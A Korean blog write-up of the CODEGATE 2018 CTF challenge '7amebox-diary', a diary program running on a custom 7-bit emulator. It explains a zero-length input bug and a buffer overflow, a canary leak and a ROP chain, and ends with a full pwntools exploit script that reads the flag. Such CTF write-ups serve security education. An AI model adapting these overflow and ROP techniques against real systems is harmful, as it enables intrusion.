---
title: "[HS2024] [CODEGATE 2018] 7amebox-diary Write-up"
date: 2024-08-01 20:00:00 +0900
categories: [WRITE-UP, PWN]
tags: [hs2024, codegate, ctf, pwn, 7amebox, vm]     # TAG names should always be lowercase
---

# 7amebox-diary Write-up

2018 Codegate 본선 문제인 7amebox-diary 문제 write-up.

## 1. Environment
- Ubuntu 16.04
- Python 2.7
```
.
├── Dockerfile
├── _7amebox_patched.py
├── flag
├── mic_check.firm
├── run.sh
└── vm_name.py
```

Emulator에 대한 분석 및 도구들은 (7amebox-name Write-up)[https://popjy0312.github.io/posts/7amebox-name/] 에서 확인 가능하다.

## 2. 바이너리 분석

프로그램을 실행하면 5개의 메뉴가 주어진다.

1. list
    - 입력된 일기들의 목록이 출력된다.
2. write
    - 일기를 입력 할 수 있다.
3. show
    - 입력된 일기를 열람 할 수 있다.
4. edit
    - 입력된 일기를 수정 할 수 있다.
5. quit
    - 종료

## 3. 취약점 분석

취약점은 크게 2개를 확인 할 수 있다.

### 3.1. Emulator의 stdin read routine
emulator의 stdin read routine에는 길이 0짜리 입력을 만들 수 있는 문제점이 존재한다.

```python
class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res

    def write(self, data):
        return None
```
`_7amebox_patched.py` 파일을 보면 위와 같은 방식으로 stdin read가 구현돼있다.

여기서 이 문제가 굳이 7bit를 선택한 이유가 나오는데, 7비트가 넘는 입력이 들어오면 break하고 그만 받도록 코드가 설계돼있다.

따라서 제일 처음부터 0b10000000 이상인 값을 넣어주면 길이 0짜리 입력을 넣어주는 것이 가능하다.

### 3.2. Buffer overflow

`write` 기능에 있는 취약점을 이용해서 원하는 길이만큼 buffer overflow를 할 수 있다.

```
diary_write:
(생략)
    0x0223 : 12 20 06 00 00  | mov      r2, 0x6     
    0x0228 : 10 5b           | mov      r5, bp      
    0x022a : 2e 50 06 00 00  | sub      r5, 0x6     
    0x022f : 10 15           | mov      r1, r5      
    0x0231 : 12 00 04 00 00  | mov      r0, 0x4     ; alloc(bp-6, 'rw')
    0x0236 : 20 00           | syscall              
    0x0238 : 10 5b           | mov      r5, bp      
    0x023a : 2e 50 06 00 00  | sub      r5, 0x6     
    0x023f : 00 75           | load     r7, r5      
    0x0241 : 10 5a           | mov      r5, r10     
    0x0243 : 11 06           | mov      r8, r6      
    0x0245 : 3f 00 03 00 00  | mul      r8, 0x3     
    0x024a : 24 58           | add      r5, r8      
    0x024c : 08 75           | store    r7, r5      
    0x024e : 12 00 32 00 12  | mov      r0, 0x932    ; title
    0x0253 : 7b 50 09 00 08  | call     pc, 0x409    ; 0x0661 print_str
    0x0258 : 10 5b           | mov      r5, bp      
    0x025a : 2e 50 06 00 00  | sub      r5, 0x6     
    0x025f : 00 65           | load     r6, r5      
    0x0261 : 12 10 1e 00 00  | mov      r1, 0x1e    
    0x0266 : 10 06           | mov      r0, r6      
    0x0268 : 7b 50 22 00 07  | call     pc, 0x3a2    ; 0x060f gets
    0x026d : 48 00           | dec      r0          
    0x026f : 10 5b           | mov      r5, bp      
    0x0271 : 2e 50 06 00 00  | sub      r5, 0x6     
    0x0276 : 00 65           | load     r6, r5      
    0x0278 : 24 60           | add      r6, r0      
    0x027a : 0d 76           | store7   zero, r6    
    0x027c : 12 00 41 00 12  | mov      r0, 0x941    ; content
    0x0281 : 7b 50 5b 00 07  | call     pc, 0x3db    ; 0x0661 print_str
    0x0286 : 10 5b           | mov      r5, bp      
    0x0288 : 2e 50 06 00 00  | sub      r5, 0x6     
    0x028d : 00 65           | load     r6, r5      
    0x028f : 26 60 1e 00 00  | add      r6, 0x1e    
    0x0294 : 12 10 30 00 09  | mov      r1, 0x4b0   
    0x0299 : 10 06           | mov      r0, r6      
    0x029b : 7b 50 6f 00 06  | call     pc, 0x36f    ; 0x060f gets
    0x02a0 : 48 00           | dec      r0          
    0x02a2 : 10 5b           | mov      r5, bp      
    0x02a4 : 2e 50 06 00 00  | sub      r5, 0x6     
    0x02a9 : 00 65           | load     r6, r5      
    0x02ab : 26 60 1e 00 00  | add      r6, 0x1e    
    0x02b0 : 24 60           | add      r6, r0      
    0x02b2 : 0d 76           | store7   zero, r6    
    0x02b4 : 10 5b           | mov      r5, bp      
    0x02b6 : 2e 50 06 00 00  | sub      r5, 0x6     
    0x02bb : 00 65           | load     r6, r5      
    0x02bd : 26 60 6c 00 09  | add      r6, 0x4ec   
    0x02c2 : 10 10           | mov      r1, r0      
    0x02c4 : 10 06           | mov      r0, r6      
    0x02c6 : 7b 50 44 00 06  | call     pc, 0x344    ; 0x060f gets
    0x02cb : 10 5b           | mov      r5, bp      
    0x02cd : 2e 50 06 00 00  | sub      r5, 0x6     
    0x02d2 : 00 65           | load     r6, r5      
    0x02d4 : 10 76           | mov      r7, r6      
    0x02d6 : 26 60 1e 00 00  | add      r6, 0x1e    ; content
    0x02db : 26 70 6c 00 09  | add      r7, 0x4ec   ; key
    0x02e0 : 55 08           | xor      r8, r8      
    0x02e2 : 5f 00 30 00 09  | cmp      r8, 0x4b0   
    0x02e7 : 6f 50 17 00 00  | je       pc, 0x17     ; 0x0303
    0x02ec : 54 55           | xor      r5, r5      
    0x02ee : 54 44           | xor      r4, r4      
    0x02f0 : 04 56           | load7    r5, r6      
    0x02f2 : 04 47           | load7    r4, r7      
    0x02f4 : 54 54           | xor      r5, r4      
    0x02f6 : 0c 56           | store7   r5, r6      
    0x02f8 : 44 60           | inc      r6          
    0x02fa : 44 70           | inc      r7          
    0x02fc : 45 00           | inc      r8          
    0x02fe : 77 50 5f 7f 7f  | jmp      pc, -0x21    ; 0x02e2
    0x0303 : 10 5b           | mov      r5, bp      
    0x0305 : 2e 50 03 00 00  | sub      r5, 0x3     
    0x030a : 00 65           | load     r6, r5      
    0x030c : 5c 69           | cmp      r6, r9      
    0x030e : 73 50 0a 00 05  | jne      pc, 0x28a    ; 0x059d stack_fail
    0x0313 : 11 4b           | mov      sp, bp      
    0x0315 : 1d 30           | pop      bp          
    0x0317 : 1d 50           | pop      pc          
```

`write` 함수를 disassemble 해보면 위와 같다.

`title`, `content`, `secret` 값을 입력받고, `content`에 `secret`과의 `xor`값을 저장하는 형태로 돼 있다.

그 중 secret을 입력받을 때, `len(content) - 1` 의 길이만큼 입력받게 돼 있다.

각 일기의 구조체를 표현하자면 아래와 같다.
```c
     |struct{
     |    byte title[0x1e];
0x1e |    byte content[0x4b0];
0x4ce|    byte dummy[0x1e];
0x4ec|    byte secret[len(content) - 1];
     |}
```

[3.1. stdin read routine](#31-emulator%EC%9D%98-stdin-read-routine)에서 설명하였듯, 길이 0짜리 `content`를 입력 할 수 있고, 그렇게되면 `secret`을 입력할 때 `MAXINT` 길이만큼 입력을 할 수 있어 Buffer overflow가 발생한다.

### 3.3. Arbitrary memory read(leak)

```c
     |struct {
59000|      word note_cnt;
59003|      node *node[0x1e];
     |}
```

일기 목록을 관리하는 구조체가 위와 같은 형태로 0x59000 주소에 존재한다.
0x59000에는 총 일기의 개수가 저장돼있고
그 이후로 각 일기 구조체의 주소값이 최대 0x1e개 저장된다.

[3.2. Buffer overflow](#32-buffer-overflow)를 활용해서 일기 구조체의 주소값에 해당하는 부분을 읽고자 하는 주소값으로 덮고 `list_diary` 를 호출하면, title을 출력하려는 과정에서 해당 주소에 있던값이 출력된다.

## 4. Exploit 전략

Exploit을 하기 위한 전략.
1. canary leak
2. ROP

### 4.1. Canary leak
일단 중요한 점은, 해당 `Emulator`는 주소값이 실행을 다시 해도 전혀 변경되지 않는다는 점이다. 이를 이용해서 주소값을 hard coding 해서 사용할 수 있다.

`diary` 구조체가 저장되는 주소는 아래의 순서대로 alloc된다.
```
[
    0xc4000,
    0x1c000,
    0x3a000,
    0xdd000,
    0x9b000,
    0xbb000,
    0xbf000,
    0xf1000,
    0x7c000,
]
```

이들 중 일기 목록을 관리하는 구조체가 존재하는 0x59000애 가까운 3번째 `diary`에서 [3.3. Arbitrary memory read(leak)](#33-arbitrary-memory-readleak)을 활용해서 canary 값을 획득할 수 있다.

### 4.2. ROP
`gets` 함수에서 bof를 해서 ROP를 수행한다.

`gets`함수의 return address가 저장돼있는 주소는 `0xf5fc2`이고, canary가 저장돼있는 주소는 `0xf5fb6`이다.

이 주소에 가장 자까운 8번째 `diary`에서 bof를 통해 rop를 수행 할 수 있다.

## 5. Result

exploit을 수행한 결과 아래와 같이 shell을 획득할 수 있다.

![exploit success](/assets/img/posts/HS2024-1/7amebox-diary/exploit_success.png)

### Full exploit code

```python
#!/usr/bin/python3
from tools.utils import *

from pwn import *


context.log_level = 'INFO'
context.arch = 'x86_64'

HOST, PORT = '127.0.0.1 8101'.split(' ')

def list_diary():
    global p
    p.sendlineafter(b'>', b'1')
    return p.recvuntil(b'1) list')

def write_diary(title, content, key):
    global p
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'title>', title)
    p.sendlineafter(b'>', content)
    p.sendline(key)

def edit_diary(idx, title, content, key):
    global p
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'index>>', str(idx).encode())
    p.sendlineafter(b'title>', title)
    p.sendlineafter(b'>', content)
    p.sendline(key)

heap_addrs = [
    0x59000,
    0xc4000,
    0x1c000,
    0x3a000,
    0xdd000,
    0x9b000,
    0xbb000,
    0xbf000,
    0xf1000,
    0x7c000,
]

gets_canary_addr = 0xf5fb6
gets_ret_addr = 0xf5fc2

canary_addr = 0xf5fc8

flag = 0xbb000

syscall = 0x0625    # syscall popcanary pop pop pop ret

p3210r = 0x0605  # pop r3 r2 r1 r0 pc
p210r = 0x0607   # pop r2 r1 r0 pc
p10r = 0x0609    # pop r1 r0 pc
p0r = 0x060b     # pop r0 pc
if __name__ == '__main__':
    global p
    p = remote(HOST, PORT)

    write_diary(b'a\x00', b'ab', b'ab')
    write_diary(b'a', b'ab', b'ab')
    payload = b'\x00' * (heap_addrs[0] - heap_addrs[3] - 0x4ec)

    chunk = encode_seven(0x3)
    chunk += encode_seven(heap_addrs[1])
    chunk += encode_seven(heap_addrs[2])
    chunk += encode_seven(canary_addr)

    payload += chunk
    payload += b'\xf0'
    write_diary(b'a', b'\xf0', payload)
    
    ret = list_diary()
    print(ret)
    canary = ret.split(b'\n')[5][2:5]    # in 7bit number
    print(canary)
    
    write_diary(b'a', b'ab', b'ab')
    write_diary(b'a', b'ab', b'ab')
    write_diary(b'flag\x00', b'ab', b'ab')
    write_diary(b'a', b'ab', b'ab')

    buf = 0xf4000

    payload2 = b'\x00' * (gets_canary_addr - heap_addrs[8] - 0x4ec)
    payload2 += canary
    payload2 += b'AAA'                  # r3
    payload2 += b'BBB'                  # r2
    payload2 += encode_seven(flag)      # r1
    
    # open('flag')
    # r1 = addr('flag') 
    # r0 = 0x1
    # syscall
    payload2 += encode_seven(p0r)
    payload2 += encode_seven(1)
    payload2 += encode_seven(syscall)
    payload2 += canary
    payload2 += encode_seven(40)        # r3
    payload2 += encode_seven(buf)       # r2
    payload2 += encode_seven(2)         # r1

    # read(2, buf, 40)
    # r3 = 40
    # r2 = buf
    # r1 = 2
    # r0 = 3
    # syscall
    payload2 += encode_seven(p0r)
    payload2 += encode_seven(3)
    payload2 += encode_seven(syscall)
    payload2 += canary
    payload2 += encode_seven(40)        # r3
    payload2 += encode_seven(buf)       # r2
    payload2 += encode_seven(1)         # r1

    # write(1, buf, 40)
    # r3 = 40
    # r2 = buf
    # r1 = 1
    # r0 = 2
    # syscall
    payload2 += encode_seven(p0r)
    payload2 += encode_seven(2)
    payload2 += encode_seven(syscall)
    
    payload2 += b'\xf0'

    write_diary(b'a', b'\xf0', payload2)
    p.interactive()
```